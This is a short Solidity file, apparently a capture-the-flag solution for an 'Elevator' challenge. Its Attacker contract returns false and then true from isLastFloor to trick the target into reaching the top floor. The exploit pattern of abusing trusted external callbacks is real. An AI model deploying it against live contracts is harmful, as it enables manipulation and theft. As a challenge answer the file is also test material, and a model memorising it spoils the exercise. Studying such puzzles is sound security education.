// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator  {
    function goTo(uint256 _floor) external;
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

// Solution:
// The elevator call isLastFloor two times on the first call we return false and
// on the second call we make it true.

contract Attacker is Building {

    bool called;
    Elevator public target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256) public returns(bool) {
        if(!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        target.goTo(1);
    }
}
